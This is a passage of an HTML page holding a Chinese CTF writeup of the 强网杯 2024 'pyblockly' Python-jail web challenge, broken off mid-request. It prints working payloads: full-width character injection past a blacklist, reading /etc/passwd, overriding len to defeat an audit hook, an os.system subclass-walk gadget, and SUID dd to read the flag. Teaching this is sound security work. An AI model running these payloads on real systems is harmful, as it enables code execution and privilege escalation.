@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="这次跟的wgpsec打。不给复现写不了wp，第一次打国内的比赛有点疏忽了。把pyblockly写详细点儿吧（pyblockly留了做题记录） 贴一下wgpsec的wp：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;NzZ-ZJlyCh2sk3vbNbswiw WEB几乎AK了，tql师傅们">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯 2024 web pyblockly 单题wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="这次跟的wgpsec打。不给复现写不了wp，第一次打国内的比赛有点疏忽了。把pyblockly写详细点儿吧（pyblockly留了做题记录） 贴一下wgpsec的wp：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;NzZ-ZJlyCh2sk3vbNbswiw WEB几乎AK了，tql师傅们">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18529990/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18529990/02.png">
+<meta property="article:published_time" content="2024-11-08T10:37:00.000Z">
+<meta property="article:modified_time" content="2024-11-08T10:37:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18529990/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>强网杯 2024 web pyblockly 单题wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2024-11-13-hkcert-2024-web-wp/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2024-10-12-tcp1pctf-2024-web-hacked-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&text=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&is_video=false&description=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=强网杯 2024 web pyblockly 单题wp&body=Check out this article: https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&title=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&name=强网杯 2024 web pyblockly 单题wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2024-11-08-2024-web-pyblockly-wp/&t=强网杯 2024 web pyblockly 单题wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        强网杯 2024 web pyblockly 单题wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-11-08T10:37:00.000Z" class="dt-published" itemprop="datePublished">2024-11-08</time>
+        
+        (Updated: <time datetime="2024-11-08T10:37:00.000Z" class="dt-updated" itemprop="dateModified">2024-11-08</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>这次跟的wgpsec打。不给复现写不了wp，第一次打国内的比赛有点疏忽了。把pyblockly写详细点儿吧（pyblockly留了做题记录）</p>
+<p>贴一下wgpsec的wp：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/NzZ-ZJlyCh2sk3vbNbswiw">https://mp.weixin.qq.com/s/NzZ-ZJlyCh2sk3vbNbswiw</a></p>
+<p>WEB几乎AK了，tql师傅们</p>
+<p>像这种PYjail接触的比较少，题目质量也很高，记录一下</p>
+<p>下载附件，读</p>
+<p>app.py</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request, jsonify</span><br><span class="line">import re</span><br><span class="line">import unidecode</span><br><span class="line">import string</span><br><span class="line">import ast</span><br><span class="line">import sys</span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import importlib.util</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[&#x27;JSON_AS_ASCII&#x27;] = False</span><br><span class="line"></span><br><span class="line">blacklist_pattern = r&quot;[!\&quot;#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\\]^_`&#123;|&#125;~]&quot;</span><br><span class="line"></span><br><span class="line">def module_exists(module_name):</span><br><span class="line"></span><br><span class="line">    spec = importlib.util.find_spec(module_name)</span><br><span class="line">    if spec is None:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    if module_name in sys.builtin_module_names:</span><br><span class="line">        return True</span><br><span class="line">    </span><br><span class="line">    if spec.origin:</span><br><span class="line">        std_lib_path = os.path.dirname(os.__file__)</span><br><span class="line">        </span><br><span class="line">        if spec.origin.startswith(std_lib_path) and not spec.origin.startswith(os.getcwd()):</span><br><span class="line">            return True</span><br><span class="line">    return False</span><br><span class="line"></span><br><span class="line">def verify_secure(m):</span><br><span class="line">    for node in ast.walk(m):</span><br><span class="line">        match type(node):</span><br><span class="line">            case ast.Import:  </span><br><span class="line">                print(&quot;ERROR: Banned module &quot;)</span><br><span class="line">                return False</span><br><span class="line">            case ast.ImportFrom: </span><br><span class="line">                print(f&quot;ERROR: Banned module &#123;node.module&#125;&quot;)</span><br><span class="line">                return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def check_for_blacklisted_symbols(input_text):</span><br><span class="line">    if re.search(blacklist_pattern, input_text):</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def block_to_python(block):</span><br><span class="line">    block_type = block[&#x27;type&#x27;]</span><br><span class="line">    code = &#x27;&#x27;</span><br><span class="line">    </span><br><span class="line">    if block_type == &#x27;print&#x27;:</span><br><span class="line">        text_block = block[&#x27;inputs&#x27;][&#x27;TEXT&#x27;][&#x27;block&#x27;]</span><br><span class="line">        text = block_to_python(text_block)  </span><br><span class="line">        code = f&quot;print(&#123;text&#125;)&quot;</span><br><span class="line">           </span><br><span class="line">    elif block_type == &#x27;math_number&#x27;:</span><br><span class="line">        </span><br><span class="line">        if str(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]).isdigit():      </span><br><span class="line">            code =  int(block[&#x27;fields&#x27;][&#x27;NUM&#x27;]) </span><br><span class="line">        else:</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">    elif block_type == &#x27;text&#x27;:</span><br><span class="line">        if check_for_blacklisted_symbols(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]):</span><br><span class="line">            code = &#x27;&#x27;</span><br><span class="line">        else:</span><br><span class="line">        </span><br><span class="line">            code =  &quot;&#x27;&quot; + unidecode.unidecode(block[&#x27;fields&#x27;][&#x27;TEXT&#x27;]) + &quot;&#x27;&quot;</span><br><span class="line">    elif block_type == &#x27;max&#x27;:</span><br><span class="line">        </span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)  </span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;max(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    elif block_type == &#x27;min&#x27;:</span><br><span class="line">        a_block = block[&#x27;inputs&#x27;][&#x27;A&#x27;][&#x27;block&#x27;]</span><br><span class="line">        b_block = block[&#x27;inputs&#x27;][&#x27;B&#x27;][&#x27;block&#x27;]</span><br><span class="line">        a = block_to_python(a_block)</span><br><span class="line">        b = block_to_python(b_block)</span><br><span class="line">        code =  f&quot;min(&#123;a&#125;, &#123;b&#125;)&quot;</span><br><span class="line"></span><br><span class="line">    if &#x27;next&#x27; in block:</span><br><span class="line">        </span><br><span class="line">        block = block[&#x27;next&#x27;][&#x27;block&#x27;]</span><br><span class="line">        </span><br><span class="line">        code +=&quot;\n&quot; + block_to_python(block)+ &quot;\n&quot;</span><br><span class="line">    else:</span><br><span class="line">        return code </span><br><span class="line">    return code</span><br><span class="line"></span><br><span class="line">def json_to_python(blockly_data):</span><br><span class="line">    block = blockly_data[&#x27;blocks&#x27;][&#x27;blocks&#x27;][0]</span><br><span class="line"></span><br><span class="line">    python_code = &quot;&quot;</span><br><span class="line">    python_code += block_to_python(block) + &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    return python_code</span><br><span class="line"></span><br><span class="line">def do(source_code):</span><br><span class="line">    hook_code = &#x27;&#x27;&#x27;</span><br><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br><span class="line"></span><br><span class="line">__import__(&#x27;sys&#x27;).addaudithook(my_audit_hook)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">    print(source_code)</span><br><span class="line">    code = hook_code + source_code</span><br><span class="line">    tree = compile(source_code, &quot;run.py&quot;, &#x27;exec&#x27;, flags=ast.PyCF_ONLY_AST)</span><br><span class="line">    try:</span><br><span class="line">        if verify_secure(tree):  </span><br><span class="line">            with open(&quot;run.py&quot;, &#x27;w&#x27;) as f:</span><br><span class="line">                f.write(code)        </span><br><span class="line">            result = subprocess.run([&#x27;python&#x27;, &#x27;run.py&#x27;], stdout=subprocess.PIPE, timeout=5).stdout.decode(&quot;utf-8&quot;)</span><br><span class="line">            os.remove(&#x27;run.py&#x27;)</span><br><span class="line">            return result</span><br><span class="line">        else:</span><br><span class="line">            return &quot;Execution aborted due to security concerns.&quot;</span><br><span class="line">    except:</span><br><span class="line">        os.remove(&#x27;run.py&#x27;)</span><br><span class="line">        return &quot;Timeout!&quot;</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;)</span><br><span class="line">def index():</span><br><span class="line">    return app.send_static_file(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/blockly_json&#x27;, methods=[&#x27;POST&#x27;])</span><br><span class="line">def blockly_json():</span><br><span class="line">    blockly_data = request.get_data()</span><br><span class="line">    print(type(blockly_data))</span><br><span class="line">    blockly_data = json.loads(blockly_data.decode(&#x27;utf-8&#x27;))</span><br><span class="line">    print(blockly_data)</span><br><span class="line">    try:</span><br><span class="line">        python_code = json_to_python(blockly_data)</span><br><span class="line">        return do(python_code)</span><br><span class="line">    except Exception as e:</span><br><span class="line">        return jsonify(&#123;&quot;error&quot;: &quot;Error generating Python code&quot;, &quot;details&quot;: str(e)&#125;)</span><br><span class="line">    </span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    app.run(host = &#x27;0.0.0.0&#x27;)</span><br></pre></td></tr></table></figure>
+
+<p>web1是很复杂的题目呢。然而其实大部分代码都没啥用，我们的思路也很明显————通过block传递恶意代码执行。</p>
+<p>出题人煞费苦心给题目套了一个很复杂的包装。其实对我们的攻击没多大影响。这里使用json_to_python来提取输入中的blocks，再在block_to_python中对每一个blocks进行分类（如print，max，min）再写入一个python文件中执行。</p>
+<p>首先在block_to_python中随便一个功能（比如说print吧），最后都是直接使用字符串拼接的方式将输入拼到代码里。这里很容易想到用<code>&#39;)</code>闭合print(‘’)并在后面用<code>;</code>或<code>\n</code>加入代码的RCE手段（要注释掉后面的<code>&#39;)</code>）。进一步可以看到print模式要获取一个TEXT，可以直接将输入经过一次unidecode.unidecode后拼入print中执行。而TEXT要经过一个检测，这里因为是先进行检测后unidecode.unidecode。所以可以用全角字符进行绕过（全角字符在unidecode.unidecode后变为半角字符）</p>
+<p>搓出payload如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;id&quot;: &quot;print1&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;id&quot;: &quot;text1&quot;,</span><br><span class="line">              &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;ｓ＂＇）\nｐｒｉｎｔ（ｏｐｅｎ（＂／ｅｔｃ／ｐａｓｓｗｄ＂， ＂ｒ＂）．ｒｅａｄ（））\n＃&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可得到文件回显</p>
+<p>这里只能读取文件，没有读取&#x2F;flag的权限。考虑到RCE+提权的方式。可以看到在将用户的输入拼入py文件时添加了一个hook函数中，对event_name长度进行了限制。并且加入限制event_name了一个黑名单。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def my_audit_hook(event_name, arg):</span><br><span class="line">    # print(f&quot;[+]&#123;event_name&#125;,&#123;arg&#125;&quot;)</span><br><span class="line">    blacklist = [&quot;popen&quot;, &quot;input&quot;, &quot;eval&quot;, &quot;exec&quot;, &quot;compile&quot;, &quot;memoryview&quot;]</span><br><span class="line">    if len(event_name) &gt; 4:</span><br><span class="line">        raise RuntimeError(&quot;Too Long!&quot;)</span><br><span class="line">    for bad in blacklist:</span><br><span class="line">        if bad in event_name:</span><br><span class="line">            raise RuntimeError(&quot;No!&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>对event_name不熟悉的师傅可以看看<a target="_blank" rel="noopener" href="https://peps.python.org/pep-0578/">https://peps.python.org/pep-0578/</a></p>
+<p>看到所有的event_name里，只有open和exec满足长度小于等于4，而exec又在黑名单里。</p>
+<p>于是考虑绕过长度检测，这里可以使用重写len函数的方式，使其永远返回3。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.len = lambda x: 3</span><br></pre></td></tr></table></figure>
+
+<p>随后我们搓个POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /blockly_json HTTP/1.1</span><br><span class="line">Host: eci-2ze1c97lhjoulskvhtrj.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Content-Length: 473</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Origin: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Referer: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;blocks&quot;: &#123;</span><br><span class="line">    &quot;blocks&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;print&quot;,</span><br><span class="line">        &quot;id&quot;: &quot;print1&quot;,</span><br><span class="line">        &quot;inputs&quot;: &#123;</span><br><span class="line">          &quot;TEXT&quot;: &#123;</span><br><span class="line">            &quot;block&quot;: &#123;</span><br><span class="line">              &quot;type&quot;: &quot;text&quot;,</span><br><span class="line">              &quot;id&quot;: &quot;text1&quot;,</span><br><span class="line"> &quot;fields&quot;: &#123;</span><br><span class="line">                &quot;TEXT&quot;: &quot;ｓ＂＇）\n＿＿ｂｕｉｌｔｉｎｓ＿＿．ｌｅｎ　＝　ｌａｍｂｄａ　ｘ：　３\nｐｒｉｎｔ（ｌｅｎ（＂ａｓｄｂｂ＂））\n＃&quot;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    ]</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到返回3</p>
+<p><img src="/images/migrated/18529990/01.png"></p>
+<p>WIN！摆脱了长度的限制之后，就只剩下一个可有可无的黑名单了</p>
+<p>限制了exec，我们就用os.system。照抄SSTIpayload即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;ls&quot;)</span><br></pre></td></tr></table></figure>
+
+<p>可以执行任意命令。接下来看SUID文件。发现DD可以越权读取</p>
+<p><img src="/images/migrated/18529990/02.png"></p>
+<p>DD读取，转全角字符，拿flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">POST /blockly_json HTTP/1.1</span><br><span class="line">Host: eci-2ze1c97lhjoulskvhtrj.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Content-Length: 473</span><br><span class="line">Accept: */*</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Origin: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000</span><br><span class="line">Referer: http://eci-2zebvccqe8nnivaz8wjh.cloudeci1.ichunqiu.com:5000/</span><br><span class="line">Accept-Encoding: gzip, deflate, 